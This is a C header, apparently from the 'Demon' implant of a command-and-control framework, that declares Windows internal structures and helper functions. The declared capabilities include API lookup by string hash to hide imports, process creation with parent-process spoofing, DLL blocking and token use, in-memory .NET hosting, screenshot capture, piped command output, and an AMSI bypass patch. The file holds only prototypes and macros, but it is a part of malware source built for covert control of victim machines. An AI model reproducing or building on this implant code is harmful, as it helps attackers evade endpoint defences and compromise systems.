#ifndef DEMON_WINUTILS_H
#define DEMON_WINUTILS_H

#include <windows.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <mscoree.h>
#include <shellapi.h>
#include <winhttp.h>

#include <Common/Macros.h>
#include <Common/EnviromentBlock.h>
#include <Common/Clr.h>

#include <Core/Syscalls.h>

// #include <Core/Native.h>
#include <iphlpapi.h>
#include <lm.h>

typedef enum _EVENT_TYPE {
    NotificationEvent,
    SynchronizationEvent
} EVENT_TYPE;

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _ANONPIPE
{
    HANDLE StdOutRead;
    HANDLE StdOutWrite;

    HANDLE StdInRead;
    HANDLE StdInWrite;
} ANONPIPE, *PANONPIPE;

typedef struct
{
    FILETIME ProcessorTime;
    FILETIME UserTime;
    FILETIME CreateTime;
    ULONG WaitTime;
#ifdef _WIN64
    ULONG pad1;
#endif
    PVOID StartAddress;
    CLIENT_ID Client_Id;
    KPRIORITY CurrentPriority;
    KPRIORITY BasePriority;
    ULONG ContextSwitchesPerSec;
    ULONG ThreadState;
    ULONG ThreadWaitReason;
    ULONG pad2;
} D_SYSTEM_THREAD_INFORMATION;


typedef struct
{
    ULONG NextOffset;
    ULONG ThreadCount;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    FILETIME CreateTime;
    FILETIME UserTime;
    FILETIME KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
#ifdef _WIN64
    ULONG pad1;
#endif
    ULONG ProcessId;
#ifdef _WIN64
    ULONG pad2;
#endif
    ULONG InheritedFromProcessId;
#ifdef _WIN64
    ULONG pad3;
#endif
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey; // always NULL, use SystemExtendedProcessInformation (57) to get value
    VM_COUNTERS VirtualMemoryCounters;
    ULONG_PTR PrivatePageCount;
    IO_COUNTERS IoCounters;
    SYSTEM_THREAD_INFORMATION ThreadInfos[1];
} D_SYSTEM_PROCESS_INFORMATION, *D_PSYSTEM_PROCESS_INFORMATION;

typedef struct _THREAD_BASIC_INFORMATION
{
    NTSTATUS                ExitStatus;
    PVOID                   TebBaseAddress;
    CLIENT_ID               ClientId;
    KAFFINITY               AffinityMask;
    KPRIORITY               Priority;
    KPRIORITY               BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

#define HASH_KEY 5381
#define WIN_FUNC(x) __typeof__(x) * x;

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

DWORD    HashStringA( PCHAR String );

PVOID    LdrFunctionAddr( HMODULE DllModuleBase, DWORD FunctionHash );
PVOID    LdrModulePeb( DWORD hash );
PVOID    LdrModuleLoad( LPSTR ModuleName );

/*!
 * @param App App path
 * @param CmdLine Process to run
 * @param Flags Process Flags
 * @param ProcessInfo Process Information struct
 * @param Piped Send output back
 * @param AnonPipes Uses Anon pipe struct as default pipe. only works if Piped is to False
 * @brief Spawns a process with current set settings (ppid spoof, blockdll, token)
 * @return
 */
BOOL    ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE AnonPipes );
BOOL    ProcessIsWow( HANDLE hProcess );
HANDLE  ProcessOpen( DWORD ProcessID, DWORD Access );

PNT_TIB W32GetTibFromThread( HANDLE hThread );
HANDLE  W32GetRandomThread( VOID );
PCHAR   TokenGetUserDomain( HANDLE hToken, PDWORD UserSize );
BOOL    W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost* ppClrMetaHost, PICLRRuntimeInfo* ppClrRuntimeInfo, ICorRuntimeHost** ppICorRuntimeHost );
BOOL    W32TakeScreenShot( PVOID* ImagePointer, PSIZE_T ImageSize );

typedef enum _MEMORY_INFORMATION_CLASS
{
    MemoryBasicInformation,
    MemoryWorkingSetInformation,
    MemoryMappedFilenameInformation,
    MemoryRegionInformation,
    MemoryWorkingSetExInformation
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

BOOL        AnonPipesInit( PANONPIPE AnonPipes );
VOID        AnonPipesRead( PANONPIPE AnonPipes );
VOID        AnonPipesClose( PANONPIPE AnonPipes );

BOOL        BypassPatchAMSI( );
ULONG       RandomNumber32( VOID );
UINT_PTR    HashStringEx( LPVOID String, UINT_PTR Length );
UINT_PTR    HashEx( LPVOID String, UINT_PTR Length, BOOL Upper );
BOOL        Win32_CreateProcessA( );
#endif
